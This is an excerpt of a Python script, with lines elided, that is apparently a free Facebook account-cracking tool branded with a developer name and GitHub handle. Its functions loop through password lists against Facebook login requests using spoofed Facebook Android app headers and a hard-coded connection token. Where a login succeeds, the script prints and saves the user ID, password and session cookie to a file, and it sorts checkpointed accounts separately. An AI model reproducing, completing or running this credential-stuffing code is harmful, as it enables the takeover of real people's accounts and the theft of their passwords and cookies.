...
{white}================================================
{red}[{white}√{red}]{green} DEVELOPER {white}▶ {green}︎It'z MASUM
{red}[{white}√{red}]{green} TOOLTYPE {white} ▶︎{green} FREE {red}({green}FILE {white}& {green}RANDOM{red})
{red}[{white}√{red}]{green} GITHUB    {white}▶︎{red} github.com/CYBER-71
{red}[{white}√{red}]{green} VERSION   {white}▶ {green}︎{0.2}
{white}================================================""")
    ...
    def __MTDONEE__(sid, name, psw,tl):
        try:
            ...
            for pw in psw:
                ...
                headers = {'User-Agent': '[FBAN/FB4A;FBAV/478.0.0.41.86;FBBV/454614319;FBDM/{density=2.5,width=1080,height=1459};FBLC/hi_IN;FBRV/591562476;FBCR/Grameenphone;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1893;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
...
def randm(ids,psd,tl):
    ...
    try:
        for pas in psd:
            ...
            "X-Tigon-Is-Retry": "False",
            'User-Agent': '[FBAN/FB4A;FBAV/478.0.0.41.86;FBBV/454614319;FBDM/{density=2.5,width=1080,height=1459};FBLC/hi_IN;FBRV/591562476;FBCR/Grameenphone;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1893;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
            "X-FB-connection-token": "d29d67d37eca387482a8a5b740f84f62",
            'Accept-Encoding':'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            "X-FB-Client-IP": "True",
        ...
        for pas in psd:
            ...
            if 'session_key' in q:
                ...
                if 'Photoshop' in res:
                    print(f"\r\r{red}[{white}√{red}] {red}[{green}ALIVE{red}] {green}{uid} {white}| {green}{pas} ")
                    oks.append(ids)
                    open('/sdcard/RELAX-M3-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                    print(f"\r\r{red}[{white}√{red}] {red}[{green}COOKIE{red}]{green} ={white} {coki}")
                    break
            elif 'www.facebook.com' in q['error_msg']:
                cps.append(ids)
